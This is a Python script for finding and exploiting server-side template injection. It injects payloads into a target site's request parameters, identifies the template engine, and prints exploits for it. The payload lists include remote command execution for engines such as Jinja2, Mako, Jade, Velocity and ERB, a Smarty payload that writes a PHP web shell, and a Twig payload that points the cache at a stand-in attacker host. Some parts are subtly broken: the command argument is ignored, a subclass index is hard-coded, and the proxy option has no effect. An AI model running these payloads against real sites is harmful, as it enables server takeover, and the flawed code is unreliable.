#!/usr/bin/env python3
"""
SSTI Scanner
Server-Side Template Injection vulnerability scanner
"""

import requests
import argparse
import urllib.parse

# SSTI payloads for different template engines
SSTI_PAYLOADS = {
    "jinja2": [
        "{{7*7}}",
        "{{config}}",
        "{{config.items()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{% import 'os' as os %}{{os.system('id')}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
    ],
    "twig": [
        "{{7*7}}",
        "{{_self.env.setCache(\"ftp://attacker.com:2121\")}}",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}",
    ],
    "smarty": [
        "{7*7}",
        "{$smarty.version}",
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearAssign())}",
    ],
    "mako": [
        "${7*7}",
        "${self.__init__.__globals__}",
        "${__import__('os').system('id')}",
    ],
    "jade": [
        "#{7*7}",
        "#{global.process.mainModule.require('child_process').execSync('id').toString()}",
    ],
    "velocity": [
        "#{7*7}",
        "#set($x='')#$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
    ],
    "tornado": [
        "{{7*7}}",
        "{% import os %}{{os.popen('id').read()}}",
    ],
    "django": [
        "{{7*7}}",
        "{% debug %}",
        "{{settings.SECRET_KEY}}",
    ],
    "ruby_erb": [
        "<%= 7*7 %>",
        "<%= `id` %>",
        "<%= system('id') %>",
    ],
    "ruby_slim": [
        "#{7*7}",
        "#{`id`}",
    ],
    "go_template": [
        "{{7*7}}",
        "{{.}}",
    ],
    "angular": [
        "{{7*7}}",
        "{{constructor.constructor('alert(1)')()}}",
    ],
}

# Expected outputs for detection
EXPECTED_OUTPUTS = {
    "jinja2": ["49", "<Config", "'os'"],
    "twig": ["49"],
    "smarty": ["49", "3.1"],
    "mako": ["49"],
    "jade": ["49"],
    "velocity": ["49"],
    "tornado": ["49"],
    "django": ["49"],
    "ruby_erb": ["49"],
    "ruby_slim": ["49"],
    "go_template": ["49"],
    "angular": ["49"],
}


def test_ssti(url, param, payload, method="GET", data=None):
    """Test for SSTI vulnerability"""
    try:
        if method.upper() == "GET":
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            if param not in params:
                return False, None
            
            params[param] = payload
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            response = requests.get(test_url, timeout=10)
        else:
            test_data = data.copy() if data else {}
            test_data[param] = payload
            response = requests.post(url, data=test_data, timeout=10)
        
        return response.text, None
    except Exception as e:
        return None, str(e)


def detect_template_engine(url, param, method="GET", data=None):
    """Detect which template engine is being used"""
    detected = []
    
    for engine, payloads in SSTI_PAYLOADS.items():
        print(f"[*] Testing {engine}...")
        
        for payload in payloads[:2]:  # Test first 2 payloads
            response, error = test_ssti(url, param, payload, method, data)
            
            if error:
                continue
            
            expected = EXPECTED_OUTPUTS.get(engine, [])
            for exp in expected:
                if exp in response:
                    print(f"[+] {engine} detected!")
                    detected.append({
                        "engine": engine,
                        "payload": payload,
                        "output": exp
                    })
                    break
    
    return detected


def exploit_ssti(engine, command="id"):
    """Generate exploitation payload"""
    exploits = {
        "jinja2": f"{{{{''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()}}}}",
        "twig": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "smarty": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearAssign())}",
        "mako": "${__import__('os').system('id')}",
        "jade": "#{global.process.mainModule.require('child_process').execSync('id').toString()}",
        "velocity": "#set($x='')#$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
        "tornado": "{% import os %}{{os.popen('id').read()}}",
        "ruby_erb": "<%= `id` %>",
    }
    
    return exploits.get(engine, "No exploit available")


def scan_ssti(url, method="GET", data=None):
    """Scan for SSTI vulnerabilities"""
    print(f"[*] Scanning: {url}")
    print(f"[*] Method: {method}\n")
    
    # Parse parameters
    if method.upper() == "GET":
        parsed = urllib.parse.urlparse(url)
        params = list(urllib.parse.parse_qs(parsed.query).keys())
    else:
        params = list(data.keys()) if data else []
    
    if not params:
        print("[!] No parameters found")
        print("[*] Trying common SSTI parameter names...")
        params = ["name", "user", "template", "content", "message", "comment", "title"]
    
    print(f"[*] Testing {len(params)} parameter(s): {', '.join(params)}\n")
    
    vulnerabilities = []
    
    for param in params:
        print(f"[*] Testing parameter: {param}")
        
        detected = detect_template_engine(url, param, method, data)
        
        if detected:
            for det in detected:
                print(f"[+] SSTI found!")
                print(f"    Engine: {det['engine']}")
                print(f"    Payload: {det['payload']}")
                print(f"    Output: {det['output']}")
                
                # Get exploit
                exploit = exploit_ssti(det['engine'])
                if exploit:
                    print(f"    Exploit: {exploit}")
                
                vulnerabilities.append({
                    "param": param,
                    "engine": det['engine'],
                    "payload": det['payload'],
                    "exploit": exploit
                })
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="SSTI Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("-d", "--data", help="POST data (format: key=value&key2=value2)")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    # Parse POST data
    post_data = None
    if args.data:
        post_data = {}
        for item in args.data.split('&'):
            if '=' in item:
                key, value = item.split('=', 1)
                post_data[key] = value
    
    vulnerabilities = scan_ssti(args.url, args.method, post_data)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} SSTI vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Engine: {vuln['engine']}")
            print(f"     Payload: {vuln['payload']}")
            if vuln['exploit']:
                print(f"     Exploit: {vuln['exploit']}")
            print()
    else:
        print("\n[-] No SSTI vulnerabilities detected")
    
    if args.output and vulnerabilities:
        with open(args.output, 'w') as f:
            for vuln in vulnerabilities:
                f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Engine: {vuln['engine']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Exploit: {vuln['exploit']}\n\n")
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
